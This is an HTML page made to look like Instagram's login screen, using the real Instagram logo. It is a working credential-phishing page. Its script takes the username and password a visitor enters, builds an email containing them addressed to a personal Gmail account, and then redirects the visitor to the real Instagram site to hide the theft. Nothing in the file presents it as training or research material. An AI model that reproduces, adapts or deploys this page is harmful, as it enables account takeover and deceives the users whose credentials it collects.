<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            max-width: 350px;
            text-align: center;
        }
        .logo {
            width: 175px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .login-btn {
            width: 100%;
            padding: 8px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
        <form id="login-form">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
    </div>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = this.elements['username'].value;
            const password = this.elements['password'].value;
            
            // Create email content
            const subject = encodeURIComponent('Instagram Login Info');
            const body = encodeURIComponent(`Username: ${username}\nPassword: ${password}`);
            
            // Redirect to Gmail compose with pre-filled data
            window.location.href = `mailto:jennypankajpatel0511@gmail.com?subject=${subject}&body=${body}`;
            
            // Redirect to real Instagram after small delay
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com';
            }, 100);
        });
    </script>
</body>
</html>
